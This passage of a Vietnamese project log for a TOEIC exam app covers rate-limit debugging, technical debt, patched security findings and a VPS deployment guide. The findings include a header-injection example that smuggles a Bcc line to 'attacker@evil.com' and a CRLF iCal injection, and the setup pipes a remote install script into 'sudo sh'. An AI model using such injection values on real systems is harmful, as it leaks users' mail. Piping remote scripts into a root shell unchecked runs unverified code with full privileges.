> production khi hai tab cùng F5 hoặc mạng chậm làm lệch nhịp. Cách đúng là làm effect **idempotent**.

**Kiểm chứng từng bước — bằng chứng chứ không phải suy đoán:**
- Sau khi vá lớp 1 và 3 (frontend, HMR nạp ngay) mà **chưa** restart backend: ngưỡng dịch từ ~3 lần F5
  sang **~5 lần**, và khi chạm thì chỉ hỏng dashboard **thay vì đá về `/login`**. Cả hai con số dịch đúng
  hướng và đúng lượng dự đoán → xác nhận lớp 1 và 3 đã ăn.
- Log Serilog cho câu trả lời quyết định trong 2 giây: `POST /api/auth/refresh-token responded **429**`
  — **không phải 401**. Đây là thứ phá vỡ sự đánh lừa của triệu chứng.

✅ **Đã kiểm chứng end-to-end 2026-08-08** sau khi restart backend: F5 liên tục 15 lần không 429 lần nào ·
Network tab chỉ còn **1** request `refresh-token` mỗi lần F5 (trước là 2) · **sai mật khẩu 6 lần vẫn ra
429** — xác nhận việc nới cho `refresh-token` **không** vô tình nới luôn cho `login` · logout xóa cookie
và set `RevokedAt` đúng.

### Lỗi phát sinh khi kiểm chứng: 429 hiện thông báo sai

Ca test "sai mật khẩu 6 lần" làm lộ tiếp hai lỗi **thông báo** — không phải lỗi logic, nhưng đẩy user
đi đúng hướng sai:

**a. Rate limiter trả 429 với BODY RỖNG.** Frontend đọc `err.response.data.error` → `undefined` → rơi
xuống câu mặc định *"Đăng nhập thất bại, thử lại sau"* / *"Email hoặc mật khẩu không đúng"*. User đọc
thành "mình gõ sai mật khẩu" nên **thử lại** — mà thử lại chính là thứ đang bị chặn. Thông báo sai
khiến user tự kéo dài thời gian bị khóa.

**b. `serverError` là state DÙNG CHUNG** giữa form mật khẩu và nút Google (`LoginPage.tsx`,
`AuthDialog.tsx`). Widget Google lỗi (nó tự gọi mạng riêng) → dòng *"Đăng nhập Google thất bại"* hiện
lên **ngay trên nút "Đăng nhập"** của form mật khẩu, dù user chưa hề bấm Google.

**Cách vá:**
- `Program.cs` — thêm `options.OnRejected`: trả JSON `{ error }` **đúng hình dạng chung của API** kèm
  header `Retry-After` chuẩn HTTP. Vì client vốn đã đọc `err.response.data.error`, **mọi màn hình tự khỏi
  mà không phải sửa gì thêm** — sửa một chỗ ở tầng đúng thay vì vá từng form

> **Giả định sai bị chính phép đo bác bỏ 🔬** — đáng nhớ vì nó suýt tạo ra một lời nói dối tinh vi.
> Ban đầu tin rằng `MetadataName.RetryAfter` của `FixedWindowRateLimiter` trả **thời gian còn lại**, nên
> viết thông báo *"thử lại sau 60 giây"*. Lấy mẫu mỗi 5 giây thì thấy nó **đứng yên**:
>
> ```
> t= 5s → 429, Retry-After=60      t=25s → 429, Retry-After=60
> t=10s → 429, Retry-After=60      t=30s → 400  (cửa sổ reset)
> ```
>
> Nó trả **ĐỘ DÀI CỬA SỔ**, không phải thời gian còn lại. Nghĩa là ở giây thứ 25 thực tế chỉ còn ~5 giây
> nhưng vẫn bảo user chờ 60. Đã đổi thành *"chờ **tối đa** 60 giây"*. Header `Retry-After` giữ nguyên vì
> hiểu theo nghĩa **cận trên** là đúng chuẩn HTTP.
>
> **Bài học:** một con số trông chính xác mà sai thì tệ hơn một ước lượng thành thật — user chờ thừa vài
> lần rồi kết luận mọi thông báo của hệ thống đều không đáng tin. Và: hai lần đo đầu **không kết luận
> được** (trả 400 vì cửa sổ đã reset) — phải chuyển từ *đoán thời điểm* sang *lấy mẫu liên tục* mới ra
> câu trả lời. Cửa sổ của `FixedWindowRateLimiter` neo theo lúc **tạo limiter**, không phải request đầu.
>
> **Bài học về cách đo:** hai lần 400 liên tiếp trông như *"không có gì bất thường"*, trong khi sự thật
> là phép đo **chưa chạm được** vào thứ cần đo. Kết quả "không thấy gì" hiếm khi là bằng chứng mọi thứ
> ổn — thường là dấu hiệu đo sai chỗ.

- `LoginPage.tsx` + `AuthDialog.tsx` — tách `googleError` khỏi `serverError`, mỗi lỗi hiện **cạnh đúng
  cái nút đã gây ra nó**; phân biệt lỗi *widget Google không mở được* với lỗi *backend từ chối*; thêm
  nhánh dự phòng cho 429 phòng khi proxy nuốt body

**Kiểm chứng 2026-08-08 — đã xong cả hai:**

| Việc | Cách kiểm | Kết quả |
|---|---|---|
| 429 trả body JSON + `Retry-After` | curl 6 lần vào `/api/auth/login` | 5 lần đầu 400, lần 6 **429** kèm `Retry-After: 60` và body `{"error":"Bạn thao tác quá nhanh. Vui lòng chờ tối đa 60 giây rồi thử lại."}` |
| Hạn mức `login` không bị nới nhầm | cùng phép trên | Vẫn chặn đúng ở lần thứ 6 → policy `"auth-refresh"` chỉ áp cho `refresh-token`/`logout` |
| Lỗi Google hiện đúng chỗ | DevTools → Network → chuột phải request `google-login` → **Block request URL** → bấm nút Google | Thông báo hiện **dưới nút Google**, không còn đè lên form mật khẩu |

> **Mẹo test đáng nhớ:** ý đầu tiên là chặn `accounts.google.com` — **sai**, vì chính cái nút cũng là
> iframe tải từ domain đó, chặn thì nút không render, chẳng có gì để bấm. Phải chặn **endpoint backend**
> (`google-login`) để Google chạy trót lọt còn lời gọi về server thì hỏng.

> **Bài học thứ tư:** thông báo lỗi là một phần của **hành vi hệ thống**, không phải trang trí. Một câu
> sai không chỉ gây khó chịu — nó chỉ cho user làm đúng cái việc khiến tình hình tệ hơn.

**Ba điều học được:**
1. **Triệu chứng nói dối.** Lỗi trông y hệt "hết phiên" nhưng là rate limit. Thứ phá vỡ được là **đọc
   status code thật** — 401 và 429 dẫn tới hai hướng điều tra khác hẳn nhau.
2. **Rate limit là quyết định bảo mật, không phải con số kỹ thuật.** Áp cùng một hạn mức lên hai endpoint
   khác mô hình đe dọa thì hoặc quá lỏng với cái này, hoặc quá chặt với cái kia — ở đây là **cả hai cùng lúc**.
3. **Nuốt lỗi thì đắt.** `.catch(() => logout())` ngắn gọn và trông vô hại, nhưng vứt đi thông tin phân
   biệt *tạm thời* với *vĩnh viễn*, biến trục trặc 60 giây thành mất phiên làm việc. Với app thi 2 tiếng,
   mất phiên = **mất bài**. Bắt lỗi mà không phân loại thường tệ hơn không bắt.

---

# 3. Nợ kỹ thuật còn lại

> Không gấp, nhưng nên biết — và **rất đáng nói khi phỏng vấn hỏi "dự án còn điểm gì chưa tốt"**.

## 3.1 · Hiệu năng

| Vấn đề | Vị trí | Cách sửa |
|---|---|---|
| **Gốc rễ: Repository materialize-everything** | `Repository.cs:25-26` | Cho `IRepository<T>` trả `IQueryable<T>`, hoặc thêm overload có `orderBy/skip/take/selector` |
| Phân trang lịch sử thi trong RAM | `TestSessionService.cs:479-490` | Hệ quả của trên |
| `/stats/parts` không có trần — nạp toàn bộ answer + question + option của user | `TestSessionService.cs:865-914` | Một query LINQ join + `GroupBy(q.Part)` để SQL trả ~7 dòng. **Dùng `ans.IsCorrect` đã lưu sẵn** thay vì query lại `QuestionOption` |
| **Không có `AsNoTracking` ở bất kỳ đâu** | toàn bộ | `UseQueryTrackingBehavior(QueryTrackingBehavior.NoTracking)` mặc định, bật tracking cho luồng ghi |
| `CancellationToken` có chữ ký nhưng không bao giờ truyền | `IRepository.cs:17` | Thêm `ct` vào action, truyền xuyên xuống. **Chi phí gần bằng 0** |
| N+1 thật khi import Excel | `QuestionService.cs:272-274` | `SaveChangesAsync` **ra ngoài** vòng lặp |
| Đếm số câu bằng cách nạp cả bảng | `TestService.cs:35-38` | `CountAsync()` dưới SQL |
| Practice: nạp cả kho câu hỏi rồi random trong RAM | `PracticeService.cs:29-46` | `ORDER BY NEWID()` hoặc lấy id trước rồi query theo lô |
| `.ToLower()` vô hiệu hóa index | `VocabularyService.cs:20-22` | Dùng collation case-insensitive ở cột thay vì hàm trong `WHERE` |
| Dashboard gọi 3 endpoint, mỗi cái quét lại toàn bộ phiên thi | `DashboardPage.tsx:220-222` | Cache Redis 5 phút — **đây chính là chỗ Redis trở nên hữu dụng** |
| Chưa có `EnableRetryOnFailure` | `Program.cs:35-36` | Bật retry cho transient fault — quan trọng khi lên VPS |

## 3.2 · Đúng đắn dữ liệu

| Vấn đề | Vị trí | Ghi chú |
|---|---|---|
| 🔬 **`GetDetail` chấm lại theo scope đề HIỆN TẠI** → xem lại một phiên cũ có thể ra điểm khác lịch sử | `TestSessionService.cs:541-662` | Ví dụ đã kiểm chứng: Reading 76/100 lưu 335; CM thêm 1 câu → scope 101 → rơi khỏi bảng ETS sang công thức MVP → **375, lệch 40 điểm**. DB không bị ghi đè, chỉ bất nhất khi hiển thị. Sửa: dùng snapshot điểm đã lưu, đừng chấm lại |
| 🔬 **TOCTOU khi nộp bài** | `TestSessionService.cs:143-263` | Hai request submit đồng thời cùng qua được check `InProgress`. `SaveChanges` atomic nên **không hỏng dữ liệu**, nhưng request thua vi phạm unique index → **HTTP 500** dù bài đã nộp thành công. Sửa: thêm `RowVersion` concurrency token |
| Không có concurrency token trên bất kỳ entity nào | `BaseEntity.cs` | **Lost update im lặng**: hai người sửa cùng bản ghi, người sau ghi đè người trước, không ai biết |
| `SaveAnswers` gửi trùng `questionId` trong 1 payload → 500 | `TestSessionService.cs:94-123` | Dedupe payload trước khi xử lý |
| `SkippedCount` ở nhánh fallback tính sai công thức | `TestSessionService.cs:654-661` | Đang là "số câu SAI + BỎ QUA" thay vì chỉ bỏ qua |
| Xóa/sửa `Question` đã có người trả lời → FK Restrict → 500 | `QuestionService.cs:105-128` | Bắt `DbUpdateException`, trả 400 với thông báo rõ |
| Cột `TestSessionAnswer.IsCorrect` **ghi mà không bao giờ đọc** | `TestSessionService.cs:211` | Mọi nơi đều chấm lại từ `SelectedOptionId`. Vừa lãng phí vừa là nguồn bất nhất |
| `fullOnly` nhận diện "full test" bằng `PartsFilter` rỗng | `TestSessionService.cs:699, 759, 825, 867` | User chọn **đủ cả 7 Part** vẫn bị loại khỏi thống kê vì `PartsFilter` không rỗng |
| `WeakestParts` không tính cỡ mẫu | `TestSessionService.cs:924-934` | Làm 1 câu Part 2 và sai → Part 2 mãi là "yếu nhất". Lọc `Total >= 5` |
| Điểm nhảy bậc khi section lệch 1 câu so với 100 | `ToeicScoreHelper.cs:41-52` | 100 câu → tra bảng ETS; 99 hoặc 101 câu → rơi sang công thức MVP, chênh vài chục điểm |

## 3.3 · Bảo mật còn lại

| Vấn đề | Vị trí |
|---|---|
| Import ZIP giải nén file **bất kỳ đuôi nào**; không giới hạn số entry (**zip bomb**). 🟡 *Giảm nhẹ 2026-08-05:* giờ giải nén vào `protected-media/` (ngoài wwwroot) nên **không** ghi được HTML/JS lên origin của API nữa — nhưng vẫn cần whitelist đuôi + giới hạn entry | `TestController.cs:177-198` |
| `MediaController` chỉ tin phần mở rộng, không kiểm nội dung file, ghi đè im lặng | `MediaController.cs:44-77` |
| ✅ **ĐÃ VÁ 2026-08-20 (Day 48)** — Refresh token lưu **plaintext** trong DB → giờ lưu SHA-256, không cần salt/chậm hoá vì input đã là 64 byte ngẫu nhiên thật | `TokenService.cs` |
| ✅ **ĐÃ VÁ 2026-08-20 (Day 48)** — Không có **reuse detection** cho refresh token → token đã revoke mà bị dùng lại thì thu hồi TOÀN BỘ token của user đó | `AuthService.cs` RefreshTokenAsync |
| Access token không thể vô hiệu hóa — `jti` sinh ra nhưng không lưu, không blacklist | `TokenService.cs:28` |
| ✅ **ĐÃ VÁ 2026-08-20 (Day 48)** — `/api/auth/logout` giờ có cả `[Authorize]` **và** kiểm quyền sở hữu token (`stored.UserId == userId`), response giống nhau dù token không tồn tại hay không thuộc user gọi → không tạo oracle | `AuthService.cs` LogoutAsync |
| ✅ **ĐÃ VÁ 2026-08-20 (Day 48)** — Login không kiểm `EmailConfirmed` + Google login gộp tài khoản chỉ bằng email → **pre-hijack account takeover**. Vá bằng `RequireConfirmedEmail=true` **và** khoá theo Google `sub` qua `AspNetUserLogins` (3 nhánh phân loại theo "đã chứng minh sở hữu email chưa"). ⚠️ Hai thứ này là **hai lỗ khác nhau** — `RequireConfirmedEmail` do `SignInManager` thi hành nên KHÔNG chặn được đường Google | `AuthService.cs` GoogleLoginAsync |
| ✅ **ĐÃ VÁ 2026-08-20 (Day 48)** — Lỗi verify Google trả nguyên `ex.Message` ra client → giờ `LogWarning` cho mình, client chỉ nhận "Token Google không hợp lệ." | `AuthService.cs` GoogleLoginAsync |
| ✅ **ĐÃ VÁ 2026-08-20 (Day 48)** — Token xác thực email và reset mật khẩu **in ra stdout** → cả hai gửi mail thật qua Gmail SMTP (MailKit), kèm trang `/reset-password` ở frontend (trước đó không tồn tại) | `AuthService.cs` Register/ForgotPassword |
| ✅ **ĐÃ VÁ 2026-08-21 (Day 48)** — DTO auth **không có validation nào**. ⚠️ Mô tả cũ "null/rỗng đi thẳng vào Identity gây 500" **SAI** — đã kiểm: `<Nullable>enable</Nullable>` làm string non-nullable thành `[Required]` ngầm nên null bị `[ApiController]` chặn thành 400 tự động, và `RequireUniqueEmail=true` khiến Identity có kiểm định dạng email. Giá trị thật của việc vá: thông báo tiếng Việt, `[MaxLength]` chống CPU DoS khi băm PBKDF2, và `InvalidModelStateResponseFactory` để lỗi validation trả đúng khuôn `{ error }` mà frontend đọc được | `DTOs/Auth/*.cs`, `Program.cs` |
| Rate limit chỉ theo IP và chỉ áp cho `AuthController`. 🟡 *Đã tách policy 2026-08-08:* `login`/`register`/`reset-password` giữ 5/phút, `refresh-token`/`logout` sang `"auth-refresh"` 30/phút — xem mục 2.9. ✅ *Phần `X-Forwarded-For` đã xử lý Day 51:* `UseForwardedHeaders` đặt **đầu chuỗi middleware** → rate limit, `HttpsRedirection` và `AuditLogs.IpAddress` đều thấy IP thật thay vì IP của Nginx | `Program.cs` |
| Thiếu `UseHsts`, security headers, `AllowedHosts = "*"` | `Program.cs:211-216` |
| ✅ **ĐÃ VÁ (Day 51)** — **Không có audit trail**: khoá tài khoản, đổi vai, đăng nhập thất bại, refresh token bị dùng lại chỉ ghi vào Serilog → không truy vấn được, bị xoay vòng rồi mất, chỉ đọc qua terminal server. Nay có bảng `AuditLogs` + `IAuditLogger` ghi 16 loại sự kiện kèm IP. ⚠️ **Bẫy gặp khi vá:** bản đầu inject thẳng `ApplicationDbContext` (cùng instance scoped với `AuthService`) — ghi log lỗi thì `try/catch` bắt được nhưng entity **kẹt trong ChangeTracker**, làm vỡ `SaveChanges` tiếp theo của nghiệp vụ chính → **đăng nhập chết**. Phải dùng `IServiceScopeFactory` tạo DbContext riêng: `try/catch` một mình KHÔNG cách ly được lỗi khi DbContext dùng chung | `AuditLogger.cs`, `AuthService.cs`, `AdminUsersController.cs` |
| ⏳ **Chưa làm** — job dọn `AuditLogs` cũ. Log `Security` sinh mỗi lần login nên bảng phình vô hạn nếu không dọn. Kế hoạch: Hangfire job 03:00 hàng ngày, xoá `Security` quá 30 ngày theo lô 5.000 dòng; `Administrative` giữ mãi | (HM-5) |
| ✅ **ĐÃ XỬ LÝ 2026-08-20 (Day 49)** — iCal injection: `RegisterUrl` ghi thẳng vào `.ics` không escape → URL chứa CRLF chèn được dòng lệnh iCal giả, user import vào Google Calendar thấy nội dung lừa đảo trông như hệ thống gửi. **Bỏ HẲN endpoint** thay vì vá: nút Download đã gỡ khỏi UI từ trước (docs 12) nên đây là **mã chết** — xóa rẻ hơn và chắc hơn escape. ⚠️ Phát hiện thêm khi vá: `EscapeIcal` cũ chỉ xử lý `\n`, **bỏ sót `\r`** (nhiều parser coi `\r` đơn lẻ cũng là hết dòng) → vá nửa vời | ~~`ExamScheduleService.cs:144-145`~~ đã xóa |
| ✅ **ĐÃ VÁ 2026-08-20 (Day 49)** — **email header injection** (không có trong audit gốc, tìm ra khi vá iCal): `subject` mail nhắc lịch thi ghép `exam.Title` thô. Title chứa `\r\nBcc: attacker@evil.com` là chèn được header SMTP → gửi bản sao mail ra ngoài. Vá bằng `SingleLine()` áp cho subject + mọi field trong body | `ExamReminderService.cs:75-88` |

## 3.4 · Chất lượng & quy trình

| Vấn đề | Ghi chú |
|---|---|
| **0 test cho exam engine** | 30 test hiện có chỉ phủ `ToeicScoreHelper` + `PartBreakdownBuilder`. `TestSessionService` — phần phức tạp nhất, đã từng có bug — không có test nào. `UnitTest1.cs` rỗng |
| **Không có CI** | `.github/workflows/` rỗng → 30 test không bao giờ chạy tự động |
| ✅ **ĐÃ VÁ (Day 49)** — Mọi lỗi nghiệp vụ trả 400 | `Result` thêm `ErrorType` (Validation/NotFound/Forbidden/Conflict/Unauthorized) + `ResultExtensions.ToActionResult` map sang HTTP status. Sửa 26 chỗ ở 9 controller. **Chỗ nghiêm trọng nhất:** "phiên thi không thuộc tài khoản này" và "không tìm thấy phiên thi" trả hai message khác nhau (cùng 400) → dò được `sessionId` nào tồn tại. Nay gộp thành **cùng một 404 với cùng một thông báo** ở cả `TestSessionService` (5 chỗ) và `PracticeService`. ⚠️ *Hồi quy phải vá kèm ở frontend:* axios interceptor coi **mọi** 401 là "token hết hạn" → login sai mật khẩu (nay 401) sẽ kích refresh rồi **logout xoá phiên đang đăng nhập**; và `MockTestPlayPage` chỉ bắt `status === 400` để đồng bộ đồng hồ, nay "phiên đã kết thúc" là 409 nên nhánh đó chết → client không bao giờ tự nộp bài |
| `AddHttpContextAccessor()` gọi hai lần | `Program.cs:92` và `:169` |
| Không có health check, không auto-migrate | DB chưa migrate → app crash lúc startup, không có endpoint chẩn đoán |
| Code chết | `IApplicationDbContext` (không đăng ký DI), `ListAllAsync`, trạng thái `Abandoned`, `package.json` ở thư mục gốc. ✅ *Đã xoá 2026-08-21:* `RefreshTokenRequest.cs` (chết từ khi `Refresh()` đọc cookie httpOnly) |
| Frontend: không có route 404 | URL sai → trang trắng hoàn toàn |
| Frontend: chỉ 1/8 trang CM xử lý lỗi 403 | Các trang còn lại nuốt lỗi phân quyền |
| **Doc lệch code** | `02-cong-nghe.md:72` ghi SQL Server ở `localhost:1433` (thực tế `1434`). 🟡 *Day 51:* `06-database.md` đã thêm `AuditLogs` và ghi chú rõ 2 bảng còn thiếu (`RefreshTokens`, `PracticeSessions`) — nhưng **vẫn chưa viết mô tả** cho hai bảng đó |

---

# 4. Lộ trình sửa

> Chia 4 giai đoạn. **Không nhảy cóc** — giai đoạn 1 là điều kiện để có thể deploy.

## Giai đoạn 1 — Chặn deploy (~1–2 ngày)

```
✅ 1. Fallback authorization policy + [AllowAnonymous] cho endpoint công khai   — XONG 2026-08-04
✅ 2. Đổi Jwt:SecretKey; secret sang User Secrets / biến môi trường            — XONG 2026-08-04
✅ 3. Đưa khung Jwt/Redis/Cors vào appsettings.json; bỏ `!`, fail fast rõ ràng  — XONG 2026-08-04
✅ 4. Sanitize HTML ở backend cho Content/Explanation/Passage/Option.Content    — XONG 2026-08-06
     ⚠️ Phải vá CẢ 3 luồng: Create, Update, và Import Excel (audit chỉ nêu 2)
✅ 5. Bảo vệ Hangfire Dashboard — Basic Auth + IsReadOnlyFunc                   — XONG 2026-08-05
✅ 6. Redis connect qua factory lambda + abortConnect=false                     — XONG 2026-08-05
✅ 7. docker-compose.prod.yml: MSSQL_PID=Express, bỏ ports, bỏ fallback pass    — XONG 2026-08-05
     ⚠️ gộp luôn việc đổi mật khẩu DB/Redis — xem phần "còn nợ" ở mục 1.3
✅ 8. Tách media ra khỏi wwwroot + signed URL cho <audio>/<img>                  — XONG 2026-08-05
```

> ## 🎯 8/8 XONG — 2026-08-06
>
> Giai đoạn 1 hoàn tất. Kế hoạch ghi *"giai đoạn 1 là điều kiện để có thể deploy"* — điều kiện đó
> giờ đã đủ. Việc tiếp theo là **Day 50: Dockerfile**.
>
> ⚠️ **Việc phải làm khi đổi máy:** [11-thiet-lap-may-moi.md](11-thiet-lap-may-moi.md) — 7 User
> Secrets (dùng `127.0.0.1`, **không** `localhost`) · `docker compose up -d --force-recreate` ·
> di chuyển media sang `protected-media/` · SQL UPDATE 2 cột URL.
>
> ### Bốn bài học xuyên suốt cả 8 lỗi
>
> **1. Middleware vs Endpoint.** Fallback policy chỉ áp lên **endpoint**. `UseStaticFiles` là
> middleware terminal → phải chuyển file ra ngoài `wwwroot` (1.8). Ngược lại
> `MapScalarApiReference` là endpoint → bị chặn 401 dù chỉ là trang docs.
>
> **2. Frontend không bao giờ là bảo mật.** Ẩn menu là GIẤU, `[Authorize]` mới là KHÓA (1.1).
> TipTap lọc XSS ở client, curl qua mặt hết (1.4). `<audio>` không gắn được header nên phải verify
> ở server (1.8).
>
> **3. Fail fast, fail closed.** Thiếu cấu hình → `InvalidOperationException` **nêu tên biến**
> (1.2). Thiếu credential Hangfire → **không mount** dashboard (1.5). Thiếu biến compose → **báo
> lỗi**, không dùng mật khẩu trong git (1.7).
>
> **4. Sửa gốc, không vá triệu chứng.** Fallback policy thay vì vá từng endpoint (1.1). Sanitize ở
> `QuestionService` — nơi cả 3 luồng đi qua — thay vì vá riêng luồng Excel (1.4).

> **Sáu biến môi trường Production** đã xác định được từ đợt sửa mục 1.2 — dùng luôn cho
> `docker-compose.prod.yml` ở Giai đoạn 3, không phải đoán:
> `ConnectionStrings__DefaultConnection` · `Redis__ConnectionStrings` · `Jwt__SecretKey` ·
> `Jwt__Issuer` · `Jwt__Audience` · `Cors__AllowedOrigins__0`

## Giai đoạn 2 — Trải nghiệm người dùng ✅ XONG

```
✅ 1. Auto-refresh token trong axios interceptor (kèm chống refresh race)      — Day 44
✅ 2. Khôi phục phiên thi khi F5 (endpoint /active + hỏi "tiếp tục hay làm lại") — Day 41
✅ 3. Ràng buộc thời gian làm bài phía server                                   — Day 40
✅ 4. Frontend biết role: backend trả roles → nav lọc theo vai → RequireRole    — Day 35-38
✅ 5. Logout gọi API thật                                                       — Day 39
✅ 6. Bật lockout khi sai mật khẩu (SignInManager)                              — Day 44
✅ 7. Validate import Excel dùng chung Validate()                               — Day 47
✅ 8. Sửa múi giờ cron + thứ tự commit/gửi mail                                 — Day 49
```

## Giai đoạn 2b — Quản trị & nhật ký (Day 50–51)

Không có trong audit gốc — phát sinh khi nhận ra trang `/admin` chỉ có **1 endpoint đọc số liệu**,
và `Sidebar` hardcode 9 mục cho **mọi vai** nên Admin thấy menu của User rồi bấm vào ăn 403.

```
✅ HM-0. Sidebar đọc navFor(user) thay vì hardcode                            — Day 50
✅ HM-0. Quản lý tài khoản: tạo/đổi vai/khoá/mở/gửi mail đặt lại mật khẩu     — Day 50
✅ HM-0. Biểu đồ tổng quan + trang xem nội dung hệ thống (chỉ đọc)            — Day 50
✅ HM-1. Theo dõi phiên thi đang diễn ra + phiên treo                         — Day 51
✅ HM-2. (BỎ) Chỉ số "đang online"                                            — xem lý do dưới
✅ HM-3. Bảng AuditLogs + ghi 16 loại sự kiện kèm IP                          — Day 51
□  HM-4. Trang xem nhật ký (lọc theo khoảng ngày, 2 tab bảo mật/quản trị)
□  HM-5. Job Hangfire dọn log Security quá 30 ngày
```

> **Vì sao BỎ chỉ số "đang online":** JWT là **stateless** — server cấp access token rồi không lưu
> gì, người dùng đóng tab thì server không hề biết. Không tồn tại danh sách "đang online" để đếm.
> Ba cách xấp xỉ: đếm refresh token còn hiệu lực (token sống 30 ngày → số luôn cao hơn thực tế rất
> nhiều), thêm cột `LastSeenAt` + middleware throttle (1 migration, chạy trên **mọi** request), hoặc
> SignalR (quá mức cho dự án phỏng vấn).
>
> Quyết định bỏ vì với 6 tài khoản thì con số luôn là 0 hoặc 1 — chính người đang mở trang admin.
> Cái đã có trả lời tốt hơn: biểu đồ *"hoạt động theo ngày"* cho xu hướng, và HM-1 cho biết chính
> xác **ai đang dùng hệ thống ngay lúc này** mà không cần cột mới.
>
> Vẫn là câu trả lời tốt khi phỏng vấn — chỉ cần biết **lý do không làm**, không cần code.

## Giai đoạn 3 — Deploy (~1–2 ngày)

Xem [Phần 5](#5-hướng-dẫn-deploy-thực-chiến).

> ⚠️ **Blocker đã biết:** `docker-compose.prod.yml` thiếu 4 biến môi trường
> (`Smtp__FromEmail`, `Smtp__Username`, `Smtp__Password`, `Frontend__BaseUrl`) → đăng ký và
> quên mật khẩu **vỡ cả hai** trên production. Sáu biến ở khung dưới là bản cũ, chưa tính SMTP.

## Giai đoạn 4 — Chất lượng & hiệu năng (làm dần)

```
□ 1. CI GitHub Actions: build + test               ← rẻ nhất, giá trị cao nhất
□ 2. Test cho TestSessionService (chấm điểm, partial test, GetDetail)
□ 3. AsNoTracking mặc định + truyền CancellationToken
□ 4. Sửa /stats/parts thành một query GroupBy dưới SQL
□ 5. Cache Redis cho dashboard — Redis mới thật sự có việc để làm
□ 6. Concurrency token (RowVersion) cho TestSession
□ 7. Phân trang dưới SQL
```

---

# 5. Hướng dẫn deploy thực chiến

## 5.1 · Mua VPS

**Cấu hình: 4GB RAM / 2 vCPU / ≥40GB SSD.**

| Thành phần | RAM |
|---|---|
| SQL Server Express | ~1,5–2 GB |
| API ASP.NET Core | ~300–400 MB |
| Redis (cap 256MB) | 256 MB |
| Nginx | ~30 MB |
| Ubuntu + Docker | ~400–500 MB |
| **Tổng** | **~2,5–3,2 GB** |

⚠️ **2GB không đủ** — riêng SQL Server đã cần 2GB, máy sẽ swap liên tục.
⚠️ **8GB gần như không giúp gì cho DB** — SQL Server Express bị chặn cứng ở ~1,4GB buffer pool và 4 core.
**4GB là điểm ngọt.**

| Nơi đặt | Giá tham khảo | Độ trễ tới VN |
|---|---|---|
| VPS Việt Nam (AZDIGI, Vietnix, Tino) | ~250–400k/tháng | thấp nhất (~5–20ms) |
| Singapore (Vultr/DigitalOcean/Linode) | ~$20–24/tháng | ~30–50ms |
| Hetzner (Đức) | ~€4.5/tháng | ~250–300ms ❌ xa |

💡 Kiểm tra [GitHub Student Pack](https://education.github.com/pack) — thường kèm credit DigitalOcean/Azure.

**Vì sao chọn VPS chứ không phải PaaS (Azure App Service):** dự án lưu media thẳng vào `wwwroot`
([MediaController.cs:57](../backend/ToeicMasterPro.API/Controllers/MediaController.cs#L57)). Trên App
Service filesystem không bền → **phải viết lại toàn bộ sang Blob Storage trước khi deploy được**. VPS
chỉ cần mount một volume. Ngoài ra Hangfire cần process chạy liên tục, và Redis managed đắt hơn cả con VPS.

## 5.2 · Bảo mật máy chủ — làm TRƯỚC khi cài gì khác

```bash
# 1. Tạo user thường, không dùng root
adduser toeic && usermod -aG sudo toeic

# 2. Đăng nhập bằng SSH key, TẮT mật khẩu
#    Trên máy bạn: ssh-copy-id toeic@<ip>
#    Trên VPS, sửa /etc/ssh/sshd_config:
#      PermitRootLogin no
#      PasswordAuthentication no
sudo systemctl restart sshd

# 3. Firewall — chỉ mở 3 cổng
sudo ufw allow 22 && sudo ufw allow 80 && sudo ufw allow 443
sudo ufw enable

# 4. Cài Docker
curl -fsSL https://get.docker.com | sudo sh
sudo usermod -aG docker toeic
```

> ⚠️ **Đừng bỏ qua bước tắt đăng nhập mật khẩu.** VPS mới dựng bị bot dò mật khẩu SSH trong vòng vài phút.

## 5.3 · Mua tên miền & trỏ DNS

**Mua ở:** Namecheap, Cloudflare Registrar (bán đúng giá gốc), hoặc nhà cung cấp VN nếu muốn `.vn`.

**Tạo tối thiểu 2 bản ghi:**
```
A     @      <IP-VPS>
A     www    <IP-VPS>        (hoặc CNAME www → @)
```

Kiểm tra: `nslookup ten-mien.com` hoặc dnschecker.org. Propagation mất vài phút tới vài giờ.

💡 **Nên trỏ qua Cloudflare** (gói miễn phí): được CDN, chống DDoS cơ bản, và **giấu IP thật của VPS**.

## 5.4 · Viết Dockerfile

**`backend/Dockerfile`** — multi-stage:
```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build
WORKDIR /src
COPY *.sln .
COPY backend/ToeicMasterPro.Domain/*.csproj         backend/ToeicMasterPro.Domain/
COPY backend/ToeicMasterPro.Application/*.csproj    backend/ToeicMasterPro.Application/
COPY backend/ToeicMasterPro.Infrastructure/*.csproj backend/ToeicMasterPro.Infrastructure/
COPY backend/ToeicMasterPro.API/*.csproj            backend/ToeicMasterPro.API/
COPY backend/ToeicMasterPro.Tests/*.csproj          backend/ToeicMasterPro.Tests/
RUN dotnet restore                                   # ← layer này được cache
COPY . .
RUN dotnet publish backend/ToeicMasterPro.API -c Release -o /app/publish --no-restore

FROM mcr.microsoft.com/dotnet/aspnet:8.0
WORKDIR /app
COPY --from=build /app/publish .
EXPOSE 8080
ENTRYPOINT ["dotnet", "ToeicMasterPro.API.dll"]
```

**`frontend/Dockerfile`** — build ra file tĩnh, Nginx phục vụ:
```dockerfile
FROM node:22-alpine AS build
WORKDIR /app
COPY frontend/package*.json ./
RUN npm ci
COPY frontend/ .
RUN npm run build

FROM nginx:alpine
COPY --from=build /app/dist /usr/share/nginx/html
COPY frontend/nginx.conf /etc/nginx/conf.d/default.conf
```

## 5.5 · `docker-compose.prod.yml`

```yaml
services:
  sqlserver:
    image: mcr.microsoft.com/mssql/server:2022-latest
    environment:
      - ACCEPT_EULA=Y
      - SA_PASSWORD=${DB_PASSWORD}          # ← KHÔNG có fallback
      - MSSQL_PID=Express                   # ← BẮT BUỘC đổi, Developer cấm dùng prod
    volumes: [sqlserver_data:/var/opt/mssql]
    restart: unless-stopped
    # ← KHÔNG có mục ports: chỉ nói chuyện trong mạng nội bộ Docker

  redis:
    image: redis:7.4-alpine
    command: ["redis-server","--requirepass","${REDIS_PASSWORD}","--appendonly","yes",
              "--maxmemory","256mb","--maxmemory-policy","allkeys-lru"]
    volumes: [redis_data:/data]
    restart: unless-stopped
    # ← cũng KHÔNG expose ports

  api:
    build: { context: ., dockerfile: backend/Dockerfile }
    environment:
      - ASPNETCORE_ENVIRONMENT=Production
      - ConnectionStrings__DefaultConnection=Server=sqlserver;Database=ToeicMasterPro;User Id=sa;Password=${DB_PASSWORD};TrustServerCertificate=True
      - Redis__ConnectionStrings=redis:6379,password=${REDIS_PASSWORD},abortConnect=false
      - Jwt__SecretKey=${JWT_SECRET}
      - Jwt__Issuer=https://toeicmaster.com
